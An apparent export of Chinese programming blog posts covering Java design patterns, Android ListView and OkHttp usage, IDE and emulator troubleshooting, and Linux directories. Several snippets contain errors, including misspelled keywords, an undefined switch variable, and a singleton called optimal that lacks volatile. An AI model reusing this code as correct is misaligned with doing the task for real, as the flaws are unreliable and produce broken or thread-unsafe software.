    <content type="text"><![CDATA[什么是观察者模式观察者模式又叫做发布订阅模式，类似于微信公众号，一个发布端，多个接收端。观察者模式定义了对象之间的一对多的依赖，这样一来，当一个对象改变时，它的所有的依赖者都会收到通知并自动更新。通俗的讲，就是在被观察类中，持有一个观察类的集合，然后在数据改变的时候，遍历所有观察类，调用更新方法。 实现观察者模式建立观察者模式的步骤 编写观察者接口和被观察者的接口 实现观察者和被观察者 注册观察者 通知观察者 编写观察者接口和被观察者的接口java中已经准备了这两个接口，观察者接口Observer和被观察者类Observable123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657public interface Observer &#123;//观察者的接口 void update(Observable observable, Object data);//只有一个用于更新的方法&#125;public class Observable &#123;//被观察者类 List&lt;Observer&gt; observers = new ArrayList&lt;Observer&gt;();//内部持有一个观察者的List集合 boolean changed = false;//数据是否改变的标志位 public Observable() &#123;&#125; public void addObserver(Observer observer) &#123;//添加观察者 if (observer == null) &#123;//防止空指针异常 throw new NullPointerException("observer == null"); &#125; synchronized (this) &#123;//同步锁 if (!observers.contains(observer))//判断是否已经添加观察者 observers.add(observer);//如果没有就添加 &#125; &#125; protected void clearChanged() &#123;//清空数据是否改变的标志位 changed = false; &#125; public int countObservers() &#123;//返回观察者的数量 return observers.size(); &#125; public synchronized void deleteObserver(Observer observer) &#123;//移除某个观察者 observers.remove(observer); &#125; public synchronized void deleteObservers() &#123;//移除所有观察者 observers.clear(); &#125; public boolean hasChanged() &#123;//获取数据是否改变的标志位 return changed; &#125; public void notifyObservers() &#123;//拉模式更新数据 notifyObservers(null); &#125; @SuppressWarnings("unchecked") public void notifyObservers(Object data) &#123;//推模式更新数据，推送data int size = 0; Observer[] arrays = null;//临时存放当前观察者的状态，参见备忘录模式 synchronized (this) &#123; if (hasChanged()) &#123;//数据是否发生改变 clearChanged();//清空标志位 size = observers.size(); arrays = new Observer[size]; observers.toArray(arrays); &#125; &#125; if (arrays != null) &#123; for (Observer observer : arrays) &#123; observer.update(this, data); &#125; &#125; &#125; protected void setChanged() &#123;//设置数据发生改变 changed = true; &#125;&#125; 实现观察者和被观察者123456789101112public class Observer1 implements Observer&#123;//观察者 public void update(Observable observable, Object data) &#123; Log.i("Observer1", "change"); &#125;&#125;public class Subject extends Observable&#123;//被观察者 public void change()&#123; setChanged();//必须调用这个方法确认修改数据 notifyObservers();通知所有观察者 &#125;&#125; 注册观察者123Subject s = new Subject();//new一个被观察者Observer1 o1 = new Observer1();//new一个观察者s.addObserver(o1);//进行注册 通知观察者1s.change(); //调用被观察者的]]></content>
      <categories>
        <category>编程杂谈</category>
      </categories>
      <tags>
        <tag>设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ListView 使用技巧]]></title>
    <url>%2Fposts%2FListView_skills.html</url>
    <content type="text"><![CDATA[ListView常用优化技巧使用ViewHolder提高效率创建一个ViewHolder内部类123class ViewHolder&#123; TextView titleView;&#125; 在getView()方法里面复用1234567891011121314LayoutInflater mInflater;public View getView(int position, View convertView, ViewGroup parent)&#123; ViewHolder holder = null; if(convertView == null)&#123;//当前子View没有被初始化过 holder = new ViewHolder(); convertView = mInflater.inflate(R.id.list_item, null);//通过LayoutInflater实例化布局 holder.titleView = (TextView) convertView.findViewById(R.id.title_view); convertView.setTag(holder);//缓存布局 &#125; else &#123; holder = (ViewHolder) convertView.getTag();//通过tag找到缓存的布局 &#125; holder.titleView.setText("title"); return convertView;&#125; 设置item分割线123android:divider = "@android:color/darker_gray"&lt;!--设置分割线资源--&gt;android:dividerHeight = "10dp"&lt;!--设置分割线高度--&gt;&lt;!--android:divider = "null"--&gt;&lt;!--分割线为空--&gt; 隐藏ListVIew滚动条1android:scrollbars="none"&lt;!--隐藏ListVIew滚动条--&gt; 取消item点击效果在Android 5.X上是一个波纹效果，在Android 5.X之下版本是一个改变背景颜色的效果。可以通过listSelector取消点击效果12andoird:listSelector="# 00000000"andoird:listSelector="@android:color/transparent"//设置选择时背景为透明色，也可使用自定义的颜色效果 设置显示到第几项1234listView.setSelection(n);//设置Listview具体显示在第几项，默认是0 listView.smoothScrollByOffset(35);//偏移量 listView.smoothScrollToPosition(35);//位置 listView.smoothScrollBy(35,1000);//距离，时间 动态修改ListView数据12data.add("new");adapter.notifyDataSetChanged(); 遍历所有item123for(int i = 0; i &lt; listView.getChildCount(); i++)&#123; View child = listView.getChildAt(i);&#125; 处理空ListView当数据源为空时，提示无数据1listView.setEmptyView(emptyView); 滑动监听使用OnTouchListener12345678910111213listView.setOnTouchListener(new OnTouchListener()&#123; public boolean onTouch(View v, MotionEvent e)&#123; swicth(e.getAction())&#123; case MotionEvent.ACTION_DOWN: //按下时操作 break; case MotionEvent.ACTION_MOVE: //移动时操作 break; case MotionEvent.ACTION_UP ://抬起时操作 break; &#125; return false; &#125;&#125;); 使用OnScrollListener123456789101112131415listView.setOnScrollListener(new OnScrollListener()&#123; public void onScrollStateChanged(AbsListView view, int scrollState)&#123; //当滑动状态改变时回调 swicth(scrollState)&#123; case OnScrollListener.SCROLL_STATE_IDLE: //滑动停止时操作 break; case OnScrollListener.SCROLL_STATE_TOUCH_SCROLL: //正在滚动 break; case OnScrollListener.SCROLL_STATE_FLING: //手指用力滑动时操作 break; &#125; &#125; public void onScroll(AbsListView view, int firstVisibleItem, int visibleItemCount, int totalItemCount)&#123; //滚动时调用 &#125;&#125;); ListView常用拓展弹性ListView可以通过增加HeaderView或者使用ScrollView嵌套使用这里通过修改源码实现。overScrollBy()是一个控制滑动到边缘的处理方法，只要修改maxOverScrollY值即可。为了适配多分辨率，建议使用DisplayMetrics 获得屏幕尺寸进行计算1234567protected boolean overScrollBy(int deltaX, int deltaY, int scrollX, int scrollY, int scrollRangeX, int scrollRangeY, int maxOverScrollX, int maxOverScrollY, boolean isTouchEvent) &#123; return super.overScrollBy(deltaX, deltaY, scrollX, scrollY, scrollRangeX, scrollRangeY, maxOverScrollX, mMaxOverScrollY, isTouchEvent); &#125;]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>ListView</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[OkHttp使用]]></title>
    <url>%2Fposts%2Fhow_to_use_OKHttp.html</url>
    <content type="text"><![CDATA[导入gradleOkHttp地址在gradle中加入123456dependencies &#123; compile fileTree(dir: 'libs', include: ['*.jar']) testCompile 'junit:junit:4.12' compile 'com.squareup.okhttp3:okhttp:3.4.1' compile 'com.squareup.okio:okio:1.9.0'&#125; 创建OkHttpClient1OkHttpClient mOkHttpClient = new OkHttpClient(); 创建Request123Request mRequest = new Request.Builder() .url("http://www.baidu.com") .build(); 创建回调Call并异步执行12345678910111213141516171819Call call = mOkHttpClient.newCall(mRequest);call.enqueue(new Callback() &#123; @Override public void onFailure(Call call, IOException e) &#123; Log.i(TAG, "失败"); &#125; @Override public void onResponse(Call call, Response response) throws IOException &#123; Log.i(TAG, "成功"+response.body()); final String html = response.body().string(); runOnUiThread(new Runnable() &#123;//在子线程中更新ui @Override public void run() &#123; contentView.setText(html); &#125; &#125;); &#125;&#125;);]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>OKHttp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Android Studio疑难解决]]></title>
    <url>%2Fposts%2FAndroid_Studio_question.html</url>
    <content type="text"><![CDATA[导入第三方类库错误：Could not find com.github.* :{jitpack-release}在使用progresshint 的第三方库时，直接在gradle中添加1234567repositories &#123; jcenter() maven &#123; url "https://jitpack.io" &#125; &#125; dependencies &#123; compile 'com.github.techery.progresshint:library-addition:&#123;jitpack-release&#125;' &#125; 但是爆出了错误1234Error:Could not find com.github.techery.progresshint:library-addition:&#123;jitpack-release&#125;. Required by: wnacg:app:unspecified Search in build.gradle files 把{jitpack-release}换成版本号就可以了解决代码1234567repositories &#123; jcenter() maven &#123; url &quot;https://jitpack.io&quot; &#125; &#125; dependencies &#123; compile &apos;com.github.techery.progresshint:library-addition:0.2.3&apos; &#125; 找不到v4、v7包1234 Rendering Problems Missing styles. Is the correct theme chosen for this layout? Use the Theme combo box above the layout to choose a different layout, or fix the theme style references. The following classes could not be found: - android.support.v7.widget.AppCompatSeekBar (Fix Build Path, Create Class) - android.support.v7.widget.RecyclerView (Fix Build Path, Create Class) Tip: Try to build the project. Failed to find style 'textViewStyle' in current theme (62 similar errors not shown) 检查了gradle中是否有导入123compile 'com.android.support:support-v4:23.4.0' compile 'com.android.support:appcompat-v7:23.4.0' compile 'com.android.support:design:23.4.0' 仍然找不到v4、v7包最后在SDK Manager中发现Android Support Library的版本号才更新到23.2.1换成23.2.1就好了]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[模版方法模式]]></title>
    <url>%2Fposts%2FTemplate_method.html</url>
    <content type="text"><![CDATA[什么是模版方法模式把多个类公有的代码抽象出来成为一个父类，并开放接口将不同的代码交由子类来实现。 123456789101112131415161718192021222324252627282930313233public abstract class Student &#123;//学生父类 protected void show()&#123; System.out.println("我的名字是:"+getName());//把公有代码抽象出来，开放一个getName()方法交给子类实现 System.out.println("我的学号是:"+getNo());//把公有代码抽象出来，开放一个getNo()方法交给子类实现 &#125; protected abstract String getNo();//交由子类实现 protected abstract String getName();//交由子类实现&#125; public class StudentA extends Student &#123;//学生A protected String getNo() &#123; return "001"; &#125; protected String getName() &#123; return "小A"; &#125;&#125; public class StudentB extends Student &#123;//学生B protected String getNo() &#123; return "002"; &#125; protected String getName() &#123; return "小B"; &#125;&#125; public class Main&#123; public static void main(String[] args)&#123; Student sa = new StudentA(); sa.show(); Student sb = new StudentB(); sb.show(); &#125; &#125;]]></content>
      <categories>
        <category>编程杂谈</category>
      </categories>
      <tags>
        <tag>设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[原型模式]]></title>
    <url>%2Fposts%2FPrototype_Pattern.html</url>
    <content type="text"><![CDATA[什么是原型模式从一个对象再创建另外一个可定制对象，而且不需要知道创建的细节。类似于僵尸母体，通过实现一个克隆的接口，将自身属性拷贝给其他僵尸，还可以进行基因突变。 拷贝方式分为 浅拷贝：仅仅复制所考虑的对象，而不复制它所引用的对象 深拷贝：将复制的对象引用的对象都复制一遍 浅拷贝 仅仅复制所考虑的对象，而不复制它所引用的对象 12345678910111213141516public class Zombie&#123;//一个僵尸类 public String id; public Zombie cloneZombie() &#123;//实现克隆方法 Zombie z = new Zombie(); z.id = this.id;//浅拷贝僵尸的id号 return z; &#125;&#125; public class Main&#123; public static void main(String[] args)&#123; Zombie cz1 = new Zombie(); cz1.id="001"; Zombie cz2 = cz1.cloneZombie(); System.out.println((cz1==cz2)+":"+cz1.id+","+cz2.id);//输出false:001,001 &#125;｝ 深拷贝 将复制的对象引用的对象都复制一遍 java中自带的java.lang.Object.clone()分析在研究原型模式的时候，我将接口中的拷贝方法命名为clone()，却发现Java内部已经有了一个clone()方法。123public class Object &#123; protected native Object clone() throws CloneNotSupportedException; &#125; 用native修饰，表示是有JNI实现，效率远高于非native方法用protected修饰，表示要使用这个clone()必须要继承自Object类，Java中所有类都是继承自Object类。返回Object对象，表示需要强制类型转换。 Java对象中的clone步骤 原型类实现Cloneable接口 重写clone方法，并调用super.clone()方法 实现深拷贝 原型类实现Cloneable接口ctrl+左键查看源码发现，这是一个空的接口。12public interface Cloneable &#123;&#125; 但是如果原型类没有实现Cloneable接口而去调用Object.clone()方法，会抛出CloneNotSupportedException异常 重写clone方法，并调用super.clone()方法继承自java.lang.Object.clone()方法是浅拷贝。1234567891011121314151617181920212223242526272829303132333435363738394041public class ZombieMSG &#123;//僵尸信息类 public String id; public String name; public ZombieMSG(String id, String name) &#123; this.id = id; this.name = name; &#125; public String toString()&#123; return "(id:"+id+",name:"+name+")"; &#125;&#125; public class Zombie implements Cloneable&#123;//僵尸类，实现Cloneable接口 public String id; public ZombieMSG msg; public Zombie(String id,String name)&#123; this.id = id; msg = new ZombieMSG(id, name); &#125; public Object clone()&#123;//重写clone方法 Object obj = null; try &#123; obj = super.clone();//调用Object中的clone()方法 &#125; catch (CloneNotSupportedException e) &#123; e.printStackTrace(); &#125; return obj; &#125;&#125; public class Main&#123; public static void main(String[] args)&#123; Zombie pz = new Zombie("000","母体僵尸"); System.out.println(pz.id+":"+pz.msg);//输出000:(id:000,name:母体僵尸) Zombie cz1 = (Zombie) pz.clone(); cz1.id="001"; cz1.msg.id="001"; cz1.msg.name="普通僵尸1号"; System.out.println((pz==cz1)+"-"+pz.id+":"+pz.msg+","+cz1.id+":"+cz1.msg); //输出false-000:(id:001,name:普通僵尸1号),,001:(id:001,name:普通僵尸1号)，说明是浅拷贝 &#125; &#125; 为什么我们在派生类中覆盖Object的clone()方法时，一定要调用super.clone()呢？在运行时刻，Object中的clone()识别你要复制的是哪一个对象。然后为此对象分配空间，并进行对象的复制，将原始对象的内容一一复制到新对象的存储空间中。 实现深拷贝克隆类和被克隆类之间不应该存在引用传递的。也就是说。普通僵尸肯定不能影响母体僵尸的，那么就要实现深拷贝。123456789101112131415161718192021222324252627282930313233343536373839public class ZombieMSG implements Cloneable&#123;//僵尸信息类，实现Cloneable接口 //其他代码不变，新增clone方法 public Object clone()&#123; ZombieMSG obj = null; try &#123; obj = (ZombieMSG) super.clone(); &#125; catch (CloneNotSupportedException e) &#123; e.printStackTrace(); &#125; return obj; &#125;&#125; public class Zombie implements Cloneable&#123;//僵尸类，实现Cloneable接口 //其他代码不变，修改clone()方法 public Object clone()&#123; Zombie obj = null; try &#123; obj = (Zombie) super.clone(); obj.msg = (ZombieMSG) this.msg.clone();//关键代码，将ZombieMSG也进行浅拷贝 &#125; catch (CloneNotSupportedException e) &#123; e.printStackTrace(); &#125; return obj; &#125; &#125; public class Main&#123; public static void main(String[] args)&#123; Zombie pz = new Zombie("000","母体僵尸"); System.out.println(pz.id+":"+pz.msg);//输出000:(id:000,name:母体僵尸) Zombie cz1 = (Zombie) pz.clone(); cz1.id="001"; cz1.msg.id="001"; cz1.msg.name="普通僵尸1号"; System.out.println((pz==cz1)+"-"+pz.id+":"+pz.msg+","+cz1.id+":"+cz1.msg); //输出false-000:(id:000,name:母体僵尸),001:(id:001,name:普通僵尸1号)，说明是深拷贝 &#125; &#125;]]></content>
      <categories>
        <category>编程杂谈</category>
      </categories>
      <tags>
        <tag>设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Genymotion疑难解决]]></title>
    <url>%2Fposts%2FGenymotion_questionh.html</url>
    <content type="text"><![CDATA[genymotion安装及使用出现的问题此处总结genymotion出现的问题。 Unable to create Virtual DeviceConnection timeout.安装好genymotion后，新建一个模拟器。去下载的时候报错Unable to create Virtual Device: Connection timeout. 在 C:\Users\[你的名字]\AppData\Local\Genymobile目录下找到 genymotion.log。 打开日志文件，在最后几行找到出错原因如下：123456四月 21 15:38:02 [Genymotion] [Debug] Remote file size: 182005760 ,current local file size: 0 四月 21 15:38:02 [Genymotion] [Debug] writting to local file with mode OpenMode( &quot;Append|WriteOnly&quot; ) 四月 21 15:38:02 [Genymotion] [Debug] Downloading file &quot;http://files2.genymotion.com/dists/4.3/ova/genymotion_vbox86p_4.3_140326_020620.ova&quot; 四月 21 15:38:02 [Genymotion] [Debug] Start timer 四月 21 15:38:02 [Genymotion] [Error] Connection Timeout 四月 21 15:38:02 [Genymotion] [Debug] Received code: 2 : &quot;&quot; 复制http://files2.genymotion.com/dists/4.3/ova/genymotion_vbox86p_4.3_140326_020620.ova到浏览器地址栏，通过浏览器下载这个ova 下载好后copy 到C:\Users\[你的名字]\AppData\Local\Genymobile\Genymotion\ova 里。再次启动genymotion，下载这个版本的模拟器就不会报错了。 Unable to start the Virtual DeviceVitualBox cannot start the virtual device问题描述打开genymotion，启动虚拟设备，出现如下报错 打开VirtualBox直接启动虚拟设备 发现是网络接口问题 解决方案打开网络中心，右键VirtualBox Host-Only Network #2，属性，开启VirtualBox NDIS6 Bridged Networking Driver。 使用Genymotion调试出现错误INSTALL_FAILED_CPU_ABI_INCOMPATIBLE解决办法转自：http://blog.csdn.net/wjr2012/article/details/16359113 点击下载Genymotion-ARM-Translation.zip 将你的虚拟器运行起来，将下载好的zip包用鼠标拖到虚拟机窗口中，出现确认对跨框点OK就行。然后重启你的虚拟机。 来源： http://www.cnblogs.com/wliangde/p/3678649.html]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[代理模式]]></title>
    <url>%2Fposts%2FProxy_Pattern.html</url>
    <content type="text"><![CDATA[什么是代理模式代理模式分为 远程代理：为不同地理的对象提供局域网代表对象 虚拟代理：将资源消耗大的对象进行延迟，需要的时候才创建 保护代理：控制对一个对象的访问权限 智能引用代理：提供对目标对象额外服务 JDK静态代理感觉就是装饰模式+模版方法模式，代理类(Driver)和被代理类(Boss)实现相同的接口(Drivable)，并把被代理类(Boss)注入到代理类(Driver)中。1234567891011121314151617181920212223242526272829public interface Drivable&#123; void drive();&#125;public class Boss implements Drivable&#123; public void drive()&#123; System.out.println("老板想开车"); &#125;&#125;public class Driver implements Drivable&#123; private Drivable boss; public Driver(Drivable boss)&#123; this.boss = boss;//注入被代理类 &#125; public void drive()&#123; System.out.println("司机来开车"); boss.drive(); System.out.println("司机已停车"); &#125;&#125;public class Main&#123; public static void main(String[] args)&#123; Boss boss = new Boss(); Driver driver = new Driver(boss); driver.drive(); &#125;&#125; JDK动态代理通过一个实现了InvocationHandler接口的类进行代理。在invoke方法中实现业务逻辑处理123456789101112131415161718192021public class DriverHandler implements InvocationHandler&#123; private Object target; public DriverHandler(Object target) &#123; this.target = target; &#125; public Object invoke(Object proxy, Method method, Object[] args) throws InvocationTargetException, IllegalAccessException &#123; System.out.println("司机来开车"); method.invoke(target,args); System.out.println("司机已停车"); return null; &#125;&#125;public class Main&#123; public static void main(String[] args)&#123; Boss boss = new Boss(); DriverHandler handler = new DriverHandler(boss); Drivable drivable = (Drivable) Proxy.newProxyInstance( boss.getClass().getClassLoader(), boss.getClass().getInterfaces(), handler); drivable.drive(); &#125;&#125; CGLIB动态代理CGLIB是通过继承实现的动态代理先导入maven123456&lt;!-- https://mvnrepository.com/artifact/cglib/cglib-nodep --&gt;&lt;dependency&gt; &lt;groupId&gt;cglib&lt;/groupId&gt; &lt;artifactId&gt;cglib-nodep&lt;/artifactId&gt; &lt;version&gt;3.2.5&lt;/version&gt;&lt;/dependency&gt; 编写代码12345678910111213141516171819202122232425262728public class Boss &#123; public void drive()&#123; System.out.println("老板想开车"); &#125;&#125;public class CglibProxy implements MethodInterceptor &#123; private Enhancer enhancer = new Enhancer(); public Object getProxy(Class clazz)&#123; enhancer.setSuperclass(clazz); enhancer.setCallback(this); return enhancer.create(); &#125; @Override public Object intercept(Object obj, Method method, Object[] args, MethodProxy proxy) throws Throwable &#123; System.out.println("司机来开车"); proxy.invokeSuper(obj, args); System.out.println("司机已停车"); return null; &#125;&#125;public class Main&#123; public static void main(String[] args)&#123; CglibProxy proxy = new CglibProxy(); Boss boss = (Boss) proxy.getProxy(Boss.class); boss.drive(); &#125;&#125;]]></content>
      <categories>
        <category>编程杂谈</category>
      </categories>
      <tags>
        <tag>设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux常见目录作用]]></title>
    <url>%2Fposts%2FLinux_base_directory.html</url>
    <content type="text"><![CDATA[常见目录作用命令目录/bin，/sbin，/usr/bin，/usr/sbin用来保存系统命令bin中的命令普通用户就可以执行sbin中的命令只有root用户才可以执行 启动目录/boot/boot 存放内核以及启动所需的文件等保存用户的启动数据，不能写满 设备文件保存目录/dev存放硬件文件 配置文件目录/etc保存系统配置文件 普通用户家目录/homeroot用户家目录/root系统函数库保存目录/lib外接存储目录/misc，/media，/mnt/misc 挂载外接磁带机/media 挂载光盘/mnt 挂载U盘等移动硬盘 内存目录/proc，/sys不能直接操作，保存内存的挂载点（内存的盘符） 临时目录/tmp存放临时数据 保存系统相关文档目录/var]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[工厂模式]]></title>
    <url>%2Fposts%2FFactory_Pattern.html</url>
    <content type="text"><![CDATA[什么是工厂模式我们创建实例对象一般都是用new进行的，但是工厂模式将new的过程封装了起来，负责将大量实现了共同接口的类实例化。 工厂模式又分为 简单工厂模式：在具体工厂类里面创建抽象的产品。 工厂方法模式：在抽象工厂类里面创建抽象的产品。 抽象工厂模式：在抽象工厂类里面创建某个族的抽象的产品。 简单工厂模式 违背了开闭原则，不利于扩展 创建抽象产品IUser，以及两个具体产品MySQLUser、SQLServerUser。通过SQLFactory工厂类创建具体产品。12345678910111213141516171819202122232425262728293031323334353637/** 客户端 */public class Main&#123; public static void main(String[] args)&#123; IUser db = UserFactory.createUserDB(UserFactory.DB_MYSQL); db.insertUser(new User()); &#125;&#125;/** 抽象的产品接口 */public interface IUser &#123; void insertUser(User user);&#125; /** 具体的产品 */public class MySQLUser implements IUser&#123; public void insertUser(User user) &#123; System.out.println("MySQL插入一条用户数据"); &#125;&#125;public class SQLServerUser implements IUser&#123; public void insertUser(User user) &#123; System.out.println("SQLServer插入一条用户数据"); &#125;&#125; /** 简单工厂 */public class SQLFactory &#123; public static final String DB_MYSQL="MySQL"; public static final String DB_SQLSERVER="SQLServer"; public static IUser createUserDB(String name)&#123; IUser db = null; switch(key)&#123;//通过key获取实例对象并返回 case DB_MYSQL:db = new MySQLUser();break; case DB_SQLSERVER:db = new SQLServerUser();break; &#125; return db; &#125;&#125; 如果需要新增子类，比如Oracle的用户类，那么就继承IUser类写一个子类，并在工厂中添加一个case分支。但是缺点也在这里，每写一个子类，都要去修改已有的UserFactory工厂类，去新增case分支，这不符合开闭原则。 工厂方法模式 优化了简单工厂模式，但是大大增加了类的数量 创建抽象产品IUser，以及两个具体产品MySQLUser、SQLServerUser。创建抽象工厂SQLFactory，以及两个具体工厂MySQLFactory、SQLServerFactory。使用多态的特性，创建具体工厂，用来生产具体产品。1234567891011121314151617181920212223242526272829303132333435363738public class Main&#123; //客户端代码 public static void main(String[] args)&#123; SQLfactory factory = new MySQLFactory(); IUser userDB = factory.createUserDB(); userDB.insertUser(new User()); &#125; /** 抽象的产品接口 */public interface IUser &#123; void insertUser(User user);&#125; /** 具体的产品 */public class MySQLUser implements IUser&#123; public void insertUser(User user) &#123; System.out.println("MySQL插入一条用户数据"); &#125;&#125;public class SQLServerUser implements IUser&#123; public void insertUser(User user) &#123; System.out.println("SQLServer插入一条用户数据"); &#125;&#125; /** 抽象的工厂 */public interface SQLFactory &#123;//一个抽象工厂的接口 public IUser createUserDB();//创建工厂的工厂&#125; /** 具体的工厂 */public class MySQLFactory implements SQLFactory&#123; public IUser createUserDB() &#123; return new MySQLUser(); &#125;&#125;public class SQLServerFactory implements SQLFactory&#123; public IUser createUserDB() &#123; return new SQLServerUser(); &#125;&#125; 在简单工厂模式的基础上，把工厂抽象出来，给每一个数据库添加一个工厂。当需要添加新的数据库功能的时候，只要添加工厂或操作类即可。不用再去关注工厂中的判断分支（实际上已经没有判断分支了）。缺点也在这，每添加一个子类功能的时候，都要创建两个类，工厂和操作类，增加了代码量。 抽象工厂模式 代码冗余，过度设计 创建抽象产品IUser，以及两个具体产品MySQLUser、SQLServerUser。创建抽象产品IAuth，以及两个具体产品MySQLAuth、SQLServerAuth。创建抽象工厂SQLFactory，以及两个具体工厂MySQLFactory、SQLServerFactory。使用多态的特性，创建具体工厂，用来生产具体产品。和工厂方法模式类似，只是增加了不同的产品。1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253public class Main&#123; //客户端代码 public static void main(String[] args)&#123; SQLfactory factory = new MySQLFactory(); IUser userDB = factory.createUserDB(); userDB.insertUser(new User()); IAuth authDB = factory.createAuthDB(); authDB.insertAuth(new Auth()); &#125; /** 抽象的产品接口 */public interface IUser &#123; void insertUser(User user);&#125; /** 具体的产品 */public class MySQLUser implements IUser&#123; public void insertUser(User user) &#123; System.out.println("MySQL插入一条用户数据"); &#125;&#125;public class SQLServerUser implements IUser&#123; public void insertUser(User user) &#123; System.out.println("SQLServer插入一条用户数据"); &#125;&#125; /** 抽象的产品接口 */public interface IAuth &#123; void insertAuth(Auth auth);&#125; /** 具体的产品 */public class MySQLAuth implements IAuth&#123; public void insertAuth(Auth auth) &#123; System.out.println("MySQL插入一条权限数据"); &#125;&#125;public class SQLServerAuth implements IAuth&#123; public void insertAuth(Auth auth) &#123; System.out.println("SQLServer插入一条权限数据"); &#125;&#125; /** 抽象的工厂 */public interface SQLFactory &#123;//一个抽象工厂的接口 public IUser createUserDB();//创建工厂的工厂 public IAuth createAuthDB();//创建工厂的工厂&#125; /** 具体的工厂 */public class MySQLFactory implements SQLFactory&#123; public IUser createUserDB() &#123; return new MySQLUser(); &#125; public IAuth createAuthDB() &#123; return new MySQLAuth(); &#125;&#125;public class SQLServerFactory implements SQLFactory&#123; public IUser createUserDB() &#123; return new SQLServerUser(); &#125; public IAuth createAuthDB() &#123; return new SQLServerAuth(); &#125;&#125; 用简单工厂+反射+配置文件优化抽象工厂 删除SQLFactory、MySQLFactory、SQLServerFactory三个工厂。融合成一个SQLFactory类，再通过properties配置文件加载类。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778public class Main&#123; //客户端代码 public static void main(String[] args)&#123; IUser userDB = SQLFactory.createUserDB(); userDB.insertUser(new User()); IAuth authDB = SQLFactory.createAuthDB(); authDB.insertAuth(new Auth()); &#125; /** 抽象的产品接口 */public interface IUser &#123; void insertUser(User user);&#125; /** 具体的产品 */public class MySQLUser implements IUser&#123; public void insertUser(User user) &#123; System.out.println("MySQL插入一条用户数据"); &#125;&#125;public class SQLServerUser implements IUser&#123; public void insertUser(User user) &#123; System.out.println("SQLServer插入一条用户数据"); &#125;&#125; /** 抽象的产品接口 */public interface IAuth &#123; void insertAuth(Auth auth);&#125; /** 具体的产品 */public class MySQLAuth implements IAuth&#123; public void insertAuth(Auth auth) &#123; System.out.println("MySQL插入一条权限数据"); &#125;&#125;public class SQLServerAuth implements IAuth&#123; public void insertAuth(Auth auth) &#123; System.out.println("SQLServer插入一条权限数据"); &#125;&#125; /** 抽象的工厂 */public class SQLFactory &#123; private static String dbName; /** 从db.properties中获取数据库信息 */ static &#123; try(InputStream in = SQLFactory.class.getResourceAsStream("/db.properties");) &#123; Properties prop = new Properties(); prop.load(in); for (Object key : prop.keySet()) &#123; if(key.equals("dbName"))&#123; dbName = prop.getProperty((String) key); &#125; &#125; &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; &#125; /** 通过反射获取IUser产品 */ public static IUser createUserDB()&#123; try &#123; Class clazz = Class.forName(dbName+"User"); return (IUser) clazz.getConstructor().newInstance();; &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; return null; &#125; /** 通过反射获取IAuth产品 */ public static IAuth createAuthDB()&#123; try &#123; Class clazz = Class.forName(dbName+"Auth"); return (IAuth) clazz.getConstructor().newInstance();; &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; return null; &#125;&#125;]]></content>
      <categories>
        <category>编程杂谈</category>
      </categories>
      <tags>
        <tag>设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[单例模式]]></title>
    <url>%2Fposts%2FSingleton_Pattern.html</url>
    <content type="text"><![CDATA[什么是单例模式？现在有一个需求，公司接了个项目，那这个项目肯定要有一个负责人，那么钦定了负责人之后，肯定不允许再出现第二个负责人了，不然员工听哪个负责人的？ 一个android应用程序的一个单例模式的类只能有且只有一个实例对象。通俗的讲，就是构造方法私有化，并在类内创建唯一一个私有的类实例,提供一个用于获取唯一实例的公有方法。12345678public class A&#123; private static A instance;//创建唯一一个私有实例 private A()&#123;&#125;//私有化构造函数 public static A getInstance()&#123; instance = new A();//初始化 return instance;//返回唯一实例 &#125;&#125; 单例模式分为以下两种类型 饿汉模式：类加载的时候便进行创建（加载类时较慢，运行时获取对象较快，线程安全） 懒汉模式：要使用的时候才进行创建（加载类时较快，运行时获取对象较慢，线程不安全） 饿汉模式 饿汉模式：类加载的时候便进行了创建（占资源） 1234567public class A&#123; private static A instance = new A();//注意这里初始化的时机 private A()&#123;&#125;//私有化构造函数 public static A getInstance()&#123; return instance;//返回唯一实例 &#125;&#125; 懒汉模式 要使用的时候才进行创建 12345678910public class A&#123; private static A instance;//创建唯一一个私有实例 private A()&#123;&#125;//私有化构造函数 public static A getInstance()&#123; if(instance==null)&#123; instance = new A();//初始化 &#125; return instance;//返回唯一实例 &#125;&#125; 多线程下的优化上面提到，懒汉式是线程不安全的，对于多线程比较陌生的可能不太理解，先看代码12345678910public class A&#123; private static A instance; private A()&#123;&#125; public static A getInstance()&#123; if(instance==null)&#123;//① instance = new A();//② &#125; return instance;//③ &#125;&#125; 当我们获取调用getInstance()方法获取A的实例对象时，如果有多个线程调用getInstance()方法，就会出现线程不安全，怎么解释呢？比如说，线程Ⅰ执行getInstance()，判断①为true，即instance为null。这时，线程Ⅰ因为某种未知的原因卡住了不能执行②，而线程Ⅱ也开始执行getInstance()，同样判断①为true。即instance为null，因为线程Ⅰ还没执行②，然后线程Ⅱ执行③，返回了一个实例对象。这时，线程Ⅰ启动了，执行了②③，返回了一个实例对象。结果是getInstance() 方法创建了两个A对象，而它本该只创建一个对象。 最优方案多线程同步的问题自然是想到了用同步锁1234567891011121314public class A&#123; private static A instance; private A()&#123;&#125; public static A getInstance()&#123; if(instance==null)&#123;//① sychronized(A.class) &#123;//② if(instance==null)&#123;//③ instance = new A();//④ &#125; &#125; &#125; return instance;//⑤ &#125;&#125; 